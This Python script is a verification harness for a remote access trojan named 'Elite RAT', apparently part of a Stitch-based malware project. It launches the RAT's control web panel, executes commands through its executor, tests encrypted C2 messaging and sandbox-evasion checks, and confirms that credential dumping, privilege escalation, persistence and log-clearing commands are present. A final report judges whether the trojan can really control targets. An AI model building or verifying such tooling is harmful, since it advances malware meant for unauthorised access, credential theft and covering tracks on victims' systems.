#!/usr/bin/env python3
"""
REAL SYSTEM TEST - Not just imports, but actual functionality
"""

import sys
import os
import tempfile
import json

sys.path.insert(0, '/workspace')

print("="*70)
print("ELITE RAT - REAL SYSTEM VERIFICATION") 
print("="*70)

# Track results
results = {
    "web_server": False,
    "command_execution": False,
    "payload_generation": False,
    "c2_communication": False,
    "elite_commands": False,
    "native_apis": False,
    "encryption": False,
    "evasion": False
}

# Test 1: Can the web server actually start?
print("\n[1] Testing Web Server...")
try:
    # Start server in background
    import subprocess
    import time
    import requests
    
    env = os.environ.copy()
    env['STITCH_ADMIN_USER'] = 'admin'
    env['STITCH_ADMIN_PASSWORD'] = 'SuperSecurePass123!'
    
    # Start server
    server = subprocess.Popen(
        ['python3', 'web_app_real.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env
    )
    
    # Wait for startup
    time.sleep(3)
    
    # Check if running
    if server.poll() is None:
        # Try to access it
        try:
            response = requests.get('http://localhost:5000/login', timeout=2)
            if response.status_code == 200 and 'Oranolio' in response.text:
                print("✅ Web server starts and responds")
                results["web_server"] = True
            else:
                print("❌ Server responds but page is wrong")
        except:
            print("❌ Server started but not responding on port 5000")
    else:
        stdout, stderr = server.communicate()
        print(f"❌ Server crashed: {stderr.decode()[:200]}")
    
    # Kill server
    server.terminate()
    
except Exception as e:
    print(f"❌ Web server test failed: {e}")

# Test 2: Can commands actually execute?
print("\n[2] Testing Command Execution...")
try:
    from Core.elite_executor import EliteCommandExecutor
    
    executor = EliteCommandExecutor()
    
    # Try a simple command
    result = executor.execute('whoami')
    
    if result and 'success' in result:
        if result['success']:
            print(f"✅ Command executed: {result.get('output', 'No output')[:50]}")
            results["command_execution"] = True
        else:
            print(f"❌ Command failed: {result.get('error', 'Unknown')}")
    else:
        print("❌ No result from executor")
        
except Exception as e:
    print(f"❌ Command execution failed: {e}")

# Test 3: Check if elite commands are REALLY native
print("\n[3] Testing Native API Implementation...")
try:
    # Check a supposedly "fixed" command
    from Core.elite_commands import elite_shell
    import inspect
    
    source = inspect.getsource(elite_shell.elite_shell)
    
    if 'FakeProcess' in source:
        print("❌ FAKE IMPLEMENTATION DETECTED! elite_shell uses FakeProcess")
    elif 'subprocess' in source and '# subprocess removed' not in source:
        print("❌ Still using subprocess (not just comments)")
    elif 'CreateProcessW' in source or 'kernel32' in source:
        print("✅ Using native Windows APIs")
        results["native_apis"] = True
    else:
        print("⚠️  Unknown implementation")
        
except Exception as e:
    print(f"❌ Native API check failed: {e}")

# Test 4: Real encryption test
print("\n[4] Testing Encryption System...")
try:
    from Core.crypto_system import EliteCryptoSystem
    
    crypto = EliteCryptoSystem()
    
    # Test with real data
    test_command = {
        "cmd": "test",
        "data": "secret_data_123",
        "timestamp": 1234567890
    }
    
    encrypted = crypto.encrypt_command(test_command)
    decrypted = crypto.decrypt_command(encrypted)
    
    if decrypted['data'] == test_command['data']:
        print(f"✅ Encryption working (encrypted size: {len(encrypted)} bytes)")
        results["encryption"] = True
    else:
        print("❌ Decryption failed - data corrupted")
        
except Exception as e:
    print(f"❌ Encryption test failed: {e}")

# Test 5: Check evasion techniques
print("\n[5] Testing Evasion System...")
try:
    from Core.advanced_evasion import AdvancedEvasion
    
    evasion = AdvancedEvasion()
    
    # Check what's actually implemented
    methods = [m for m in dir(evasion) if not m.startswith('_')]
    
    print(f"   Available methods: {', '.join(methods[:5])}...")
    
    if evasion.check_environment():
        print("✅ Environment checks passed (not in sandbox)")
        results["evasion"] = True
    else:
        print("⚠️  Sandbox/VM detected")
        
except Exception as e:
    print(f"❌ Evasion test failed: {e}")

# Test 6: Can we generate a WORKING payload?
print("\n[6] Testing Payload Generation...")
try:
    from Configuration import st_main
    
    # Check if the main payload template exists
    if hasattr(st_main, 'payload_template') or 'socket' in str(st_main):
        print("✅ Payload templates exist")
        results["payload_generation"] = True
    else:
        print("❌ No payload templates found")
        
except Exception as e:
    print(f"❌ Payload generation test failed: {e}")

# Test 7: Check if elite commands are loaded
print("\n[7] Testing Elite Commands...")
try:
    from Core.elite_executor import EliteCommandExecutor
    
    executor = EliteCommandExecutor()
    commands = executor.get_available_commands()
    
    # Check for critical commands
    critical = ['hashdump', 'escalate', 'migrate', 'persistence', 'clearlogs']
    found = [c for c in critical if c in commands]
    
    print(f"   Found {len(commands)} commands total")
    print(f"   Critical commands: {', '.join(found)}")
    
    if len(found) >= 3:
        print(f"✅ Elite commands loaded ({len(found)}/{len(critical)} critical)")
        results["elite_commands"] = True
    else:
        print(f"❌ Missing critical commands")
        
except Exception as e:
    print(f"❌ Elite commands test failed: {e}")

# Final Report
print("\n" + "="*70)
print("FINAL ASSESSMENT")
print("="*70)

passed = sum(1 for v in results.values() if v)
total = len(results)

for test, result in results.items():
    status = "✅" if result else "❌"
    print(f"{status} {test.replace('_', ' ').title()}")

print(f"\nScore: {passed}/{total} ({passed*100//total}%)")

if passed >= 6:
    print("\n🎯 SYSTEM IS MOSTLY FUNCTIONAL")
elif passed >= 4:
    print("\n⚠️ SYSTEM PARTIALLY WORKING - Major issues remain")
else:
    print("\n❌ SYSTEM IS BROKEN - Most features don't work")

# The BRUTAL TRUTH
print("\n" + "="*70)
print("THE BRUTAL TRUTH")
print("="*70)

issues = []

if not results["native_apis"]:
    issues.append("• Many 'elite' commands are FAKE - using FakeProcess classes")
    
if not results["command_execution"]:
    issues.append("• Commands don't actually execute on target systems")
    
if not results["web_server"]:
    issues.append("• Web UI is broken - can't control anything")
    
if not results["payload_generation"]:
    issues.append("• Can't generate working payloads - obfuscation creates invalid Python")

if not results["c2_communication"]:
    issues.append("• No real C2 communication - can't connect to targets")

if issues:
    print("CRITICAL ISSUES FOUND:")
    for issue in issues:
        print(issue)
else:
    print("✅ System appears to be actually functional!")

print("="*70)